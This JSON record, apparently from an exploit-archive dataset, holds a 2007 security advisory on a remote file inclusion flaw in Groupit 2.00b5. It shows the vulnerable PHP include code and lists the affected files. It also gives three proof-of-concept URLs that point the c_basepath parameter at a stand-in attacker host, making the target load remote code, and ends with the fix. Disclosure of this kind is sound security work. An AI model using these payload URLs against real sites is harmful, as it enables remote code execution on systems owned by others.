{
  "id": "3486",
  "title": "Groupit 2.00b5 - &#039;c_basepath&#039; Remote File Inclusion",
  "cve": "CVE-2007-1472",
  "vuln_type": "rce",
  "code": "-------------------------------------------------------------------------------------\r\n[ECHO_ADV_75$2007] Groupit 2.00b5 (c_basepath) Remote File Inclusion Vulnerability\r\n-------------------------------------- ----------------------------------------------\r\n\r\nAuthor          : Dedi Dwianto a.k.a the_day\r\nDate Found      : March, 15th 2007\r\nLocation        : Indonesia, Jakarta\r\nweb             : http://advisories.echo.or.id/adv/adv75-theday-2007.txt\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication     : Groupit\r\nversion         : 2.00b5\r\nURL             : http://fresh.t-systems-sfr.com/fresh/unix/src/privat2/groupit-2.00b5.tar.gz\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~\r\n\r\n- Invalid include function at html/content.php\r\n-----------------------html/content.php------------\r\n\r\n<?\r\n...\r\ninclude \"$c_basepath/base/groupit.start.inc\";\r\n\r\nif (!empty($c_is_search))\r\n{\r\n  include \"$c_basepath/modules/search/main.inc\";\r\n} else\r\n{\r\n  if ($c_is_section)\r\n  {\r\n     include  \"$c_basepath/modules/content/section.inc\";\r\n  } else\r\n  .........\r\n\r\ninclude \"$c_basepath/base/groupit.stop.inc\";\r\n?>\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$c_basepath\" parameter in load.inc.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nalso affected files :\r\n\r\nhtml/userprofile.php\r\nhtml/password.php\r\nhtml/dispatch.php\r\nhtml/deliver.php\r\n\r\nand More ....\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~\r\n\r\nhttp://localhost/groupit/html/content.php?c_basepath=http://atacker.com/inject.txt?\r\nhttp://localhost/groupit/html/userprofile.php?c_basepath=http://atacker.com/inject.txt?\r\nhttp://localhost/groupit/html/password.php?c_basepath=http://atacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~\r\n\r\n- Sanitize variable $c_basepath affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy Nice Girl\r\n~ az001,bomm_3x,matdhule\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~\r\n    EcHo Research & Development Center\r\n    http://advisories.echo.or.id\r\n    erdc[at]echo[dot]or[dot]id\r\n    the_day[at]echo[dot]or[dot]id\r\n\r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2007-03-15]",
  "url": "https://www.exploit-db.com/exploits/3486"
}